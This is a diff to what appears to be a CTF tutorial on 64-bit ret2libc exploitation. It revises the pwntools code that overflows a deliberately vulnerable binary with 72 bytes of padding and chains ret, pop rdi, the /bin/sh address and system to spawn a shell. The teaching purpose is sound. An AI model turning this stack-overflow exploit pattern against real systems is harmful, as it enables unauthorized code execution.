@@ -20,7 +20,7 @@ strings challenge | grep -i flag
 
 Sample output for a deliberately vulnerable challenge binary:
 
-```
+```text
 challenge: ELF 32-bit LSB executable, Intel 80386, dynamically linked
 RELRO           STACK CANARY      NX            PIE
 Partial RELRO   No canary found   NX disabled   No PIE
@@ -204,18 +204,23 @@ On 64-bit x86-64, function arguments are passed in registers (`rdi`, `rsi`, `rdx
   </Step>
 
   <Step title="Stage 2 — Call system('/bin/sh')">
-    With `libc_base` known, compute the runtime addresses of `system` and the `/bin/sh` string, then send the second payload:
+    With `libc_base` known, compute the runtime addresses of `system` and the `/bin/sh` string. Because `system` is a raw integer address (not a named symbol in the binary), build the payload manually with `flat()` so that the `pop rdi` gadget is inserted explicitly — this guarantees `rdi` is set to the `/bin/sh` pointer before `system` is called:
 
     ```python
+    rop_helper = ROP(binary)
+    pop_rdi    = rop_helper.find_gadget(['pop rdi', 'ret'])[0]
+    ret_gadget = rop_helper.find_gadget(['ret'])[0]   # 16-byte alignment
+
     system = libc_base + libc.symbols['system']
     binsh  = libc_base + next(libc.search(b'/bin/sh'))
-    ret    = ROP(binary).find_gadget(['ret'])[0]  # stack alignment
 
-    rop2 = ROP(binary)
-    rop2.raw(ret)                        # 16-byte alignment for x86-64 ABI
-    rop2.call(system, [binsh])
-
-    payload2 = b'A' * 72 + rop2.chain()
+    payload2 = flat(
+        b'A' * 72,
+        ret_gadget,   # realign stack to 16-byte boundary before system()
+        pop_rdi,
+        binsh,
+        system
+    )
     p.sendline(payload2)
     p.interactive()
     ```
@@ -303,13 +308,12 @@ Always test your exploit locally against a copy of the binary before pointing it
     # ── Stage 2: system('/bin/sh') ───────────────────────────
     system = libc_base + libc.symbols['system']
     binsh  = libc_base + next(libc.search(b'/bin/sh'))
-    ret    = ROP(binary).find_gadget(['ret'])[0]
 
-    rop2 = ROP(binary)
-    rop2.raw(ret)
-    rop2.call(system, [binsh])
+    rop2       = ROP(binary)
+    pop_rdi    = rop2.find_gadget(['pop rdi', 'ret'])[0]
+    ret_gadget = rop2.find_gadget(['ret'])[0]
 
-    p.sendline(b'A' * 72 + rop2.chain())
+    p.sendline(b'A' * 72 + flat(ret_gadget, pop_rdi, binsh, system))
     p.interactive()
     ```
   </Tab>
